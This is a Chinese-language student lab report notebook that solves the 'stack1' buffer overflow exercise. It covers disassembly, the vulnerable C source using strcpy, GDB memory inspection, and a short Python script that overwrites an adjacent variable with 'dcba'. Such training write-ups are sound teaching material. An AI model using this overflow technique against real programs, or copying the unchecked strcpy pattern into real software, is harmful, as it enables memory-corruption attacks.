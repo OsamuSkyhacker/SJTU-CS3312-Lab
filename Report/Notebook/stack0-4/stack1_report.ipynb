{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## CS3312 Lab Report Stack1\n",
    "\n",
    "Osamu Takenaka 520030990026"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 源码分析\n",
    "\n",
    "x86汇编代码(由objdump得到)：\n",
    "\n",
    "```asm\n",
    "08048464 <main>:\n",
    " 8048464:\t55                   \tpush   %ebp\n",
    " 8048465:\t89 e5                \tmov    %esp,%ebp\n",
    " 8048467:\t83 e4 f0             \tand    $0xfffffff0,%esp\n",
    " 804846a:\t83 ec 60             \tsub    $0x60,%esp\n",
    " 804846d:\t83 7d 08 01          \tcmpl   $0x1,0x8(%ebp)\n",
    " 8048471:\t75 14                \tjne    8048487 <main+0x23>\n",
    " 8048473:\tc7 44 24 04 a0 85 04 \tmovl   $0x80485a0,0x4(%esp)\n",
    " 804847a:\t08 \n",
    " 804847b:\tc7 04 24 01 00 00 00 \tmovl   $0x1,(%esp)\n",
    " 8048482:\te8 01 ff ff ff       \tcall   8048388 <errx@plt>\n",
    " 8048487:\tc7 44 24 5c 00 00 00 \tmovl   $0x0,0x5c(%esp)\n",
    " 804848e:\t00 \n",
    " 804848f:\t8b 45 0c             \tmov    0xc(%ebp),%eax\n",
    " 8048492:\t83 c0 04             \tadd    $0x4,%eax\n",
    " 8048495:\t8b 00                \tmov    (%eax),%eax\n",
    " 8048497:\t89 44 24 04          \tmov    %eax,0x4(%esp)\n",
    " 804849b:\t8d 44 24 1c          \tlea    0x1c(%esp),%eax\n",
    " 804849f:\t89 04 24             \tmov    %eax,(%esp)\n",
    " 80484a2:\te8 c1 fe ff ff       \tcall   8048368 <strcpy@plt>\n",
    " 80484a7:\t8b 44 24 5c          \tmov    0x5c(%esp),%eax\n",
    " 80484ab:\t3d 64 63 62 61       \tcmp    $0x61626364,%eax\n",
    " 80484b0:\t75 0e                \tjne    80484c0 <main+0x5c>\n",
    " 80484b2:\tc7 04 24 bc 85 04 08 \tmovl   $0x80485bc,(%esp)\n",
    " 80484b9:\te8 da fe ff ff       \tcall   8048398 <puts@plt>\n",
    " 80484be:\teb 15                \tjmp    80484d5 <main+0x71>\n",
    " 80484c0:\t8b 54 24 5c          \tmov    0x5c(%esp),%edx\n",
    " 80484c4:\tb8 f3 85 04 08       \tmov    $0x80485f3,%eax\n",
    " 80484c9:\t89 54 24 04          \tmov    %edx,0x4(%esp)\n",
    " 80484cd:\t89 04 24             \tmov    %eax,(%esp)\n",
    " 80484d0:\te8 a3 fe ff ff       \tcall   8048378 <printf@plt>\n",
    " 80484d5:\tc9                   \tleave  \n",
    " 80484d6:\tc3                   \tret    \n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "C语言源代码：\n",
    "```c\n",
    "#include <stdlib.h>\n",
    "#include <unistd.h>\n",
    "#include <stdio.h>\n",
    "#include <string.h>\n",
    "\n",
    "int main(int argc, char **argv)\n",
    "{\n",
    "    volatile int modified;\n",
    "    char buffer[64];\n",
    "\n",
    "    if(argc == 1) {\n",
    "        errx(1, \"please specify an argument\\n\");\n",
    "    }\n",
    "\n",
    "    modified = 0;\n",
    "    strcpy(buffer, argv[1]);\n",
    "\n",
    "    if(modified == 0x61626364) {\n",
    "        printf(\"you have correctly got the variable to the right value\\n\");\n",
    "    } else {\n",
    "        printf(\"Try again, you got 0x%08x\\n\", modified);\n",
    "    }\n",
    "}\n",
    "\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "和实验stack0类似，这段C程序同样是一个典型的缓冲区溢出漏洞，和实验stack0不同的地方在于：\n",
    "\n",
    "其使用`strcpy`函数将命令行参数（`argv[1]`）复制到缓冲区`buffer`中。`strcpy`函数不会检查目标缓冲区的大小，因此如果输入的数据超过了64字节，就会发生缓冲区溢出。\n",
    "\n",
    "通过构造的输入，攻击者可以覆盖`modified`变量的值。\n",
    "\n",
    "程序检查`modified`是否被设置为特定值（`0x61626364`），如果是，就会打印成功的消息，这表明攻击成功。\n",
    "\n",
    "同样地，我们接下来，我们需要知道`buffer`的地址和`modified`的地址，然后通过输入超长字符串来覆盖`modified`的值。"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### GDB调试\n",
    "\n",
    "通过 `modified = 0`这句C代码可以很容易找到对应的汇编代码：\n",
    "\n",
    "```asm\n",
    " 8048487:\tc7 44 24 5c 00 00 00 \tmovl   $0x0,0x5c(%esp)\n",
    "```\n",
    "不难看出，modfied变量的地址是0x5c加上寄存器esp的值。\n",
    "\n",
    "接下来我们需要通过gdb，来查看esp的值，以及buffer的地址。\n",
    "\n",
    "由于该程序需要一个参数，所以我们需要在gdb中传入参数，这里我们传入64个`'a'`，\n",
    "\n",
    "添加函数main的断点，然后运行程序，查看esp的值：\n",
    "\n",
    "<img src=\"https://cdn.mathpix.com/snip/images/Panl5112oSQY9DInoHyKgDJuCjenfj-4tYxq0uxNhMo.original.fullsize.png\" width=\"50%\">\n",
    "\n",
    "\n",
    "可以看到`%esp`的值是`0xfff8f4c0`，所以`modified`的地址是`0xfff8f4c0 + 0x5c = 0xfff8f51c`\n",
    "\n",
    "然后我们打印`0xfff8f4c0`开始的内存区域，找到buffer的地址区域\n",
    "\n",
    "<img src=\"https://cdn.mathpix.com/snip/images/SCosCZxp3Vwt8-agchUjBHLSakk-dXG6x_jevnlUkvU.original.fullsize.png\" width=\"50%\">\n",
    "\n",
    "可以很明显地看到大片的‘a'即`0x61`，即为buffer的地址区域，为`0xfff8f4dc`至`0xfff8f51b`\n",
    "我们定位到`modified`的地址`0xfff8f51c`，可以发现它就紧挨着buffer的地址区域结束的地方。\n",
    "\n",
    "于是我们只要在构造参数时，在64个字符后，再加一些字符，就可以覆盖`modified`的值。\n",
    "\n",
    "我们的目标是让`modified`的值变为`0x61626364`，即\n",
    "\n",
    "该系统为小端，所以`modified`在内存中应该是`0x64 0x63 0x62 0x61`（地址从左至右依次增大），所以溢出部分构造的字符即`dcba`"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 攻击脚本内容\n",
    "\n",
    "为了显示更清楚，我们前64个字符用`'x'`所以我们构造的参数为：\n",
    "\n",
    "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdcba\n",
    "\n",
    "script_stack1.py:\n",
    "```python\n",
    "input = 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdcba'\n",
    "print input\n",
    "```\n",
    "\n",
    "在终端中运行：\n",
    "\n",
    "```bash\n",
    "./stack1 `python script_stack1.py`\n",
    "```\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 结果（非GDB环境）\n",
    "\n",
    "<img src=\"https://cdn.mathpix.com/snip/images/t_dHYMO2eQ3oonxvtVtSKeEOP8Y9CAlrY3FITWLhMDw.original.fullsize.png\" width=\"50%\">\n",
    "\n",
    "攻击成功"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
